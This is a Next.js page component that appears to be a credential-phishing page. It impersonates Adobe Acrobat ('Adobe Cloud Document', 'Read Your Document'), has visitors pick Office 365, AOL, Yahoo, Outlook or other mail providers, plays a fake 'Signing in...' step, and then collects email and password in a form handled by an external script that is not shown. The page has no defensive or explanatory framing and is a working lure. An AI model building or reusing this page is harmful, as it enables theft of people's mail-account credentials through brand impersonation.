import Head from 'next/head';

export default function Home() {
  return (
    <>
      <Head>
        <title>Adobe Cloud Document</title>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="stylesheet" href="/styles.css" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="background-overlay"></div>
      <div className="container">
        <div className="header-flex">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
            alt="Adobe Acrobat Logo"
            className="logo"
          />
          <div className="header-content">
            <h1>Read Your Document</h1>
            <p>Please select your e-mail provider below:</p>
          </div>
        </div>

        <section id="provider-selection" className="page active">
          <div className="providers">
            <button className="provider-btn" data-provider="office365">
              <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Office365" /> Office 365
            </button>
            <button className="provider-btn" data-provider="aol">
              <img src="https://cdn-icons-png.flaticon.com/512/732/732222.png" alt="AOL" /> AOL
            </button>
            <button className="provider-btn" data-provider="yahoo">
              <img src="https://cdn-icons-png.flaticon.com/512/732/732200.png" alt="Yahoo" /> Yahoo
            </button>
            <button className="provider-btn" data-provider="outlook">
              <img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" alt="Outlook" /> Outlook
            </button>
            <button className="provider-btn" data-provider="others">
              <img src="https://cdn-icons-png.flaticon.com/512/25/25373.png" alt="Others" /> Others
            </button>
          </div>
        </section>

        <section id="signing-in" className="page">
          <div className="signing-in-spinner"></div>
          <h1>Signing in...</h1>
          <p>
            Please wait while we prepare your sign-in with{' '}
            <span id="signing-in-provider"></span>.
          </p>
        </section>

        <section id="credentials-input" className="page">
          <h1 id="credentials-title"></h1>
          <form id="credentials-form">
            <label htmlFor="email">Email:</label>
            <input type="email" id="email" name="email" required />
            <label htmlFor="password">Password:</label>
            <input type="password" id="password" name="password" required />
            <button type="submit">Submit</button>
          </form>
          <button id="back-to-providers" className="back-btn">Back</button>
          <div id="login-error" style={{ color: 'red', display: 'none', marginTop: '1em' }}></div>
        </section>

        <footer>
          <p>© 2025 Adobe Cloud Incorporated System</p>
        </footer>
      </div>
      {/* Scripts should be handled in Next.js with next/script, but for plain compatibility: */}
      <script type="module" src="/script.js"></script>
    </>
  );
}